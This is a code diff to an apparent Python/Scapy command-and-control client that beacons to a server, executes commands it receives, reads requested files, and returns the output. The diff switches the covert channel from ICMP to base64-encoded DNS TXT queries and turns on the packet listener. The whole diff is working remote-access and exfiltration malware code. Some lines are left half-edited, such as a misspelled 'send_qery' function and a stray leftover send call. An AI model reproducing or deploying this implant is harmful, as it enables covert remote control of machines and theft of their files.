@@ -12,8 +12,8 @@ def send_beacon(addr,data):
     while cond == 0:
         # pkt_no_data = IP(dst=addr)/ICMP(type="echo-request")
         # pkt_send(pkt_no_data,data,0)
-        pkt_no_data = IP(dst=addr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=base64.b64encode(data)))
-        send(pkt_no_data)
+        #pkt_no_data = IP(dst=addr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=base64.b64encode(data)))
+        send_qery(addr,data,0)
         print("send beacon")
         time.sleep(5)
     
@@ -22,36 +22,41 @@ def parse_packet(packet):
     
     if  Raw in packet:
         global cond
-        cond = 1
         
-        prefix_packet = check_prefix(packet)     
-        data_recieved = extract_data(packet)
-        pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
-        
-        if prefix_packet == RUN or prefix_packet == FILE:
-            txt_recieved = bin_to_str(data_recieved)
-            if prefix_packet == RUN:
-                output = RunCommand(txt_recieved)
-                bin_output = bytes(output.encode())
-                pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
-                pkt_send(pkt_no_data,bin_output,1)
-            else:
-                output = read_file(txt_recieved)   # read in binary mode
-                pkt_send(pkt_no_data,BEGIN_FILE + data_recieved,0)
-                pkt_send(pkt_no_data,output,1)
-            pkt_send(pkt_no_data,EF,0)
-                
-        cond = 0
-        print("cond changed to " + str(cond))
+        if packet.haslayer(DNS) and packet.getlayer(DNS).rr == 0: 
+            cond = 1
+            get_an = packet[DNS].qd.rdata
+            prefix_packet = check_prefix(get_an)     
+            data_recieved = extract_data(get_an,prefix_packet)
+            #pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
+            
+            if prefix_packet == RUN or prefix_packet == FILE:
+                txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
+                if prefix_packet == RUN:
+                    output = RunCommand(txt_recieved)
+                    bin_output = bytes(output.encode())
+                    send_qery(SERVER_ADR,base64.b64encode(BEGIN_OUTPUT)+data_recieved,0)
+                    send_qery(SERVER_ADR,base64.b64encode(bin_output),1)
+                    # pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
+                    # pkt_send(pkt_no_data,bin_output,1)
+                else:
+                    output = read_file(txt_recieved)   # read in binary mode
+                    send_qery(SERVER_ADR,base64.b64encode(BEGIN_FILE)+data_recieved,0)
+                    send_qery(SERVER_ADR,base64.b64encode(output),1)
+                    pkt_send(SERVER_ADR,output,1)
+                send_qery(SERVER_ADR,base64.b64encode(EF),0)
+                    
+            cond = 0
+            print("cond changed to " + str(cond))
         
 
 def client_listen():
     print("client start listening")
-    sniff_pkt(pfilter=ICMP_RESPONSE + " and host " + SERVER_ADR,handler=parse_packet)
+    sniff_pkt(pfilter="port 53" + " and host " + SERVER_ADR,handler=parse_packet)
     
 
 if __name__=="__main__":
     signal.signal(signal.SIGINT, signal_handler)
     beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
     beacon_thread.start()
-    #client_listen()
+    client_listen()
